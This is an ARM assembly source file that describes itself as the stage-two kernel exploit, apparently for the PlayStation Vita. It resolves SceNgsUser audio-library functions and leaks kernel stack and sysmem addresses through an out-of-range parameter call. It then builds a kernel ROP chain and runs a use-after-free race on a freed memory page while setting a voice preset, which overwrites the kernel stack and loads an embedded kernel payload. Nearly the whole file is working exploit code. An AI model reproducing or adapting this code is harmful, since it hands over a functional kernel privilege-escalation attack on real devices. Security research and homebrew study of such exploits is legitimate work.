/* stage2.S -- implementation of the kernel exploit
 *
 * Copyright (C) 2019 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

.include "../include/constants.S"
.include "../include/functions.S"
.include "../include/gadgets.S"
.include "../include/macros.S"
.include "krop.S"

// SceLibKernel offsets
.equ SCE_LIB_KERNEL_OFFSET,           -0xa4b7
.equ GET_MODULE_LIST_OFFSET,          0x675c
.equ GET_MODULE_INFO_OFFSET,          0x676c
.equ GET_THREAD_INFO_OFFSET,          0xa791

// SceNgsUser offsets
.equ SYSTEM_GET_SIZE_OFFSET,          0x54d
.equ SYSTEM_INIT_OFFSET,              0x57d
.equ RACK_GET_SIZE_OFFSET,            0xb29
.equ RACK_INIT_OFFSET,                0xb65
.equ RACK_RELEASE_OFFSET,             0xda1
.equ GET_VOICE_HANDLE_OFFSET,         0xd65
.equ VOICE_GET_PARAMS_OOF_OFFSET,     0x1325
.equ VOICE_DEF_GET_TEMPLATE1_OFFSET,  0x1671
.equ VOICE_SET_PRESET_OFFSET,         0x884c

.global _start
_start:
  /** STAGE 1: Initialize framebuffer and ngs system **/

  // Terminate vdispThread so we can draw our own screen
  call_vv vdispSetState, vdispCtrl, VDISP_STATE_EXIT
  call_v  vdispEnd,      vdispCtrl

  // Allocate memory in cdram
  call_vvvv sceKernelAllocMemBlock,   empty_string, SCE_KERNEL_MEMBLOCK_TYPE_USER_CDRAM_RW, 0x200000, NULL
  call_rv   sceKernelGetMemBlockBase, ret, framebuf + 0x04

  // Set framebuf
  call_vv sceDisplaySetFrameBuf, framebuf, SCE_DISPLAY_SETBUF_NEXTFRAME

  // Flash white
  call_lvv memset, framebuf + 0x04, 0xff, 960 * 544 * 4

  // Get SceLibKernel base address
  call_v   sceIoOpen, 0xDEADBEEF
  get_lr
  add_rv   ret, SCE_LIB_KERNEL_OFFSET
  store_rv ret, libkernel_base

  // Get SceLibKernel functions
  load_add_store sceKernelGetModuleList, libkernel_base, GET_MODULE_LIST_OFFSET
  load_add_store sceKernelGetModuleInfo, libkernel_base, GET_MODULE_INFO_OFFSET
  load_add_store sceKernelGetThreadInfo, libkernel_base, GET_THREAD_INFO_OFFSET

  // Load SceNgsUser module
  call_v sceSysmoduleLoadModule, SCE_SYSMODULE_NGS

  // Get first entry of module list which should be SceNgsUser
  store_vv      1, mod_count
  load_call_vvv sceKernelGetModuleList, 0xff, mod_list, mod_count

  // Get SceNgsUser base address
  store_vv     0x1b8, mod_info + 0x00
  load_call_lv sceKernelGetModuleInfo, mod_list + 0x00, mod_info
  store_lv     mod_info + 0x15c, ngs_base

  // Get SceNgsUser functions
  load_add_store sceNgsSystemGetRequiredMemorySize, ngs_base, SYSTEM_GET_SIZE_OFFSET
  load_add_store sceNgsSystemInit,                  ngs_base, SYSTEM_INIT_OFFSET
  load_add_store sceNgsRackGetRequiredMemorySize,   ngs_base, RACK_GET_SIZE_OFFSET
  load_add_store sceNgsRackInit,                    ngs_base, RACK_INIT_OFFSET
  load_add_store sceNgsRackRelease,                 ngs_base, RACK_RELEASE_OFFSET
  load_add_store sceNgsRackGetVoiceHandle,          ngs_base, GET_VOICE_HANDLE_OFFSET
  load_add_store sceNgsVoiceGetParamsOutOfRange,    ngs_base, VOICE_GET_PARAMS_OOF_OFFSET
  load_add_store sceNgsVoiceDefGetTemplate1,        ngs_base, VOICE_DEF_GET_TEMPLATE1_OFFSET
  load_add_store sceNgsVoiceSetPresetInternal,      ngs_base, VOICE_SET_PRESET_OFFSET

  // Determine memory requirement for system
  load_call_vv sceNgsSystemGetRequiredMemorySize, init_params, sys_size

  // Allocate system memory
  call_vl  memalign, 256, sys_size
  store_rv           ret, sys_mem

  // Initialize ngs system
  load_call_llvv sceNgsSystemInit, sys_mem, sys_size, init_params, sys_handle

  // Rack description
  load_call_v sceNgsVoiceDefGetTemplate1, 0xDEADBEEF
  store_rv    ret, rack_desc + 0x00

  // Determine memory requirement for rack
  load_call_lvv sceNgsRackGetRequiredMemorySize, sys_handle, rack_desc, buffer_info + 0x04

  // Allocate rack memory
  call_vl  memalign, 256, buffer_info + 0x04
  store_rv           ret, buffer_info + 0x00

  // Initialize rack
  load_call_lvvv sceNgsRackInit, sys_handle, buffer_info, rack_desc, rack_handle

  // Get voice handle
  load_call_lvv sceNgsRackGetVoiceHandle, rack_handle, 0, voice_handle

  /** STAGE 2: Exploitation **/

  // Leak kernel stack
  call_v sceRtcGetCurrentClockLocalTime, 0
  load_call_lvv sceNgsVoiceGetParamsOutOfRange, voice_handle, -1, kstack_leak

  store_lv kstack_leak + 0x6c, kstack_base
  load_add_store kstack_base, kstack_base, KSTACK_OFFSET

  store_lv kstack_leak + 0x60, sysmem_base
  load_add_store sysmem_base, sysmem_base, SCE_SYSMEM_OFFSET

  // Build kernel rop chain
  build_krop overwrite_buf

  // Build pivot kernel rop chain
  build_pivot_krop overwrite_buf + 0xf9c - (KSTACK_SIZE - 0x400)

  // Point to writeable page
  store_lv kstack_base, overwrite_buf + 0xf30 - (KSTACK_SIZE - 0x400)

  // Allocate first page
  call_vvvv sceKernelAllocMemBlock, empty_string, SCE_KERNEL_MEMBLOCK_TYPE_USER_RW_UNCACHE, 0x1000, NULL
  store_rv  ret, block_id_1
  call_lv   sceKernelGetMemBlockBase, block_id_1, block_data_1
  load_add_store block_data_1, block_data_1, 0x1000 - 0x04

  // Allocate second page
  call_vvvv sceKernelAllocMemBlock, empty_string, SCE_KERNEL_MEMBLOCK_TYPE_USER_RW_UNCACHE, 0x1000, NULL
  store_rv  ret, block_id_2
  call_lv   sceKernelGetMemBlockBase, block_id_2, block_data_2

  // Copy part of voice preset into second page
  call_lvv memcpy, block_data_2, voice_preset + 0x04, 0x24 - 0x04 + 0x400

  // Backup loop
  call_vvv memcpy, loop_backup_1, loop_start, loop_mid - loop_start
  call_vvv memcpy, loop_backup_2, loop_mid,   loop_end - loop_mid

  // Race
  loop_start:
    // Restore loop
    call_vvv memcpy, loop_mid, loop_backup_2, loop_end - loop_mid

    // Create thread
    call_vvvvvvv sceKernelCreateThread, empty_string, pop_pc, SCE_KERNEL_HIGHEST_PRIORITY_USER, 0x1000, 0, 0, NULL
    store_rv     ret, thread_id

    // Start thread
    call_lvv sceKernelStartThread, thread_id, thread_rop_end - thread_rop_start, thread_rop_start

    // Free first page
    call_l sceKernelFreeMemBlock, block_id_1

    // Trigger exploit
    load_call_ll sceNgsVoiceSetPresetInternal, voice_handle, block_data_1

    // Wait for thread to end
    call_lvv sceKernelWaitThreadEnd, thread_id, NULL, NULL

  loop_mid:

    // Restore loop
    call_vvv memcpy, loop_start, loop_backup_1, loop_mid - loop_start

     // Stack pivot
    set_r0_r2_ip_sp_lr_pc ldm_data_r0
  loop_end:

  // Exit and delete thread
  call_v sceKernelExitDeleteThread, 0

// Data section

// Thread rop chain
thread_rop_start:
  // Ghetto wait
  .rept 0x3e5
    .word pop_pc
  .endr

  // Reclaim first page
  call_vvvv sceKernelAllocMemBlock, empty_string, SCE_KERNEL_MEMBLOCK_TYPE_USER_RW_UNCACHE, 0x1000, NULL
  store_rv  ret, block_id_1

  // Exit and delete thread
  call_v sceKernelExitDeleteThread, 0
thread_rop_end:

// ldm data for setting sp
ldm_data_r0:                       .word 0xDEADBEEF // r0
                                   .word 0xDEADBEEF // r2
                                   .word 0xDEADBEEF // ip
                                   .word loop_start // sp
                                   .word 0xDEADBEEF // lr
                                   .word pop_pc     // pc

// ldm data for setting lr
ldm_data_r8:                       .word 0xDEADBEEF // r0
                                   .word 0xDEADBEEF // r1
                                   .word 0xDEADBEEF // r4
                                   .word 0xDEADBEEF // r5
                                   .word 0xDEADBEEF // sl
                                   .word 0xDEADBEEF // ip
                                   .word 0xDEADBEEF // lr
                                   .word pop_pc     // pc

// Framebuf
framebuf:                          .word 24         // size
                                   .word 0xDEADBEEF // base
                                   .word 960        // pitch
                                   .word 0          // pixelformat
                                   .word 960        // width
                                   .word 544        // height

// Ngs system init params
init_params:                       .word 64         // nMaxRacks
                                   .word 64         // nMaxVoices
                                   .word 512        // nGranularity
                                   .word 48000      // nSampleRate
                                   .word 1          // nMaxModules

// Rack description
rack_desc:                         .word 0xDEADBEEF // pVoiceDefn
                                   .word 1          // nVoices
                                   .word 1          // nChannelsPerVoice
                                   .word 0          // nMaxPatchesPerInput
                                   .word 1          // nPatchesPerOutput
                                   .word 0          // pUserReleaseData

// Voice preset
voice_preset:                      .word 0xDEADBEEF // nNameOffset
                                   .word 0xDEADBEEF // uNameLength
                                   .word 0x24       // nPresetDataOffset
                                   .word 0x400      // uSizePresetData
                                   .word 0x24       // nBypassFlagsOffset
                                   .word -(0x118/4) // uNumBypassFlags
                                   .word 0xDEADBEEF
                                   .word 0xDEADBEEF
                                   .word 0xDEADBEEF
overwrite_buf:                     .zero 0x400

// Message :)
message:                           .word 0xDEADBEEF
                                   .string "Hi Sony! Why don't you hire me? :("

// Kernel payload
payload_start:
.incbin "payload.bin.gz", 0xa // skip gzip header
payload_end:
.set payload_size, payload_end - payload_start
.balign 0x4

// Base addresses
kstack_base:                       .word 0
sysmem_base:                       .word 0
libkernel_base:                    .word 0
ngs_base:                          .word 0

// SceLibKernel functions
sceKernelGetModuleList:            .word 0
sceKernelGetModuleInfo:            .word 0
sceKernelGetThreadInfo:            .word 0

// SceNgsUser functions
sceNgsSystemGetRequiredMemorySize: .word 0
sceNgsSystemInit:                  .word 0
sceNgsRackGetRequiredMemorySize:   .word 0
sceNgsRackInit:                    .word 0
sceNgsRackRelease:                 .word 0
sceNgsRackGetVoiceHandle:          .word 0
sceNgsVoiceDefGetTemplate1:        .word 0
sceNgsVoiceSetPresetInternal:      .word 0
sceNgsVoiceGetParamsOutOfRange:    .word 0

// Module variables
mod_count:                         .word 0
mod_list:                          .zero 0x4
mod_info:                          .zero 0x1b8

// Thread variables
thread_id:                         .word 0
thread_stack_base:                 .word 0
thread_info:                       .zero 0x7c

// Ngs system variables
sys_handle:                        .word 0
sys_mem:                           .word 0
sys_size:                          .word 0

// Ngs rack variables
buffer_info:                       .word 0 // data
                                   .word 0 // size

rack_handle:                       .word 0
voice_handle:                      .word 0

// Block variables
block_id_1:                        .word 0
block_id_2:                        .word 0
block_data_1:                      .word 0
block_data_2:                      .word 0

// Kernel stack leak
kstack_leak:                       .zero 0x80

// Loop backup
loop_backup_1:                     .zero loop_mid - loop_start
loop_backup_2:                     .zero loop_end - loop_mid
